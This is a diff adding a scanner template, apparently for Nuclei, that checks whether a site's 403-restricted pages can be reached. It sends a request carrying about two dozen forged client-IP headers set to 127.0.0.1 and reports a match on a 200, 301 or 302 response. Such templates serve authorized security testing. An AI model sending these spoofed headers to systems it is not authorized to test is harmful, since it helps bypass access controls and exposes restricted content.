@@ -1,0 +1,46 @@
+id: fuzz-403page-bypass
+
+info:
+  name: 目录扫描-403页面绕过
+  author: capiton
+  severity: low
+  description: ""
+
+requests:
+  - raw:
+      - |-
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Client-IP: 127.0.0.1
+        Forwarded: 127.0.0.1
+        Forwarded-For: 127.0.0.1
+        Forwarded-For-Ip: 127.0.0.1
+        True-Client-IP: 127.0.0.1
+        X-Client-IP: 127.0.0.1
+        X-Custom-IP-Authorization: 127.0.0.1
+        X-Forward: 127.0.0.1
+        X-Forward-For: 127.0.0.1
+        X-Forwarded: 127.0.0.1
+        X-Forwarded-By: 127.0.0.1
+        X-Forwarded-For: 127.0.0.1
+        X-Forwarded-For-Original: 127.0.0.1
+        X-Forwarded-Host: 127.0.0.1
+        X-Forwarded-Server: 127.0.0.1
+        X-Host: 127.0.0.1
+        X-HTTP-Host-Override: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Real-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        X-SSL-Client-IP: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        name: 200
+        status:
+          - 200
+          - 301
+          - 302
+        condition: or
+
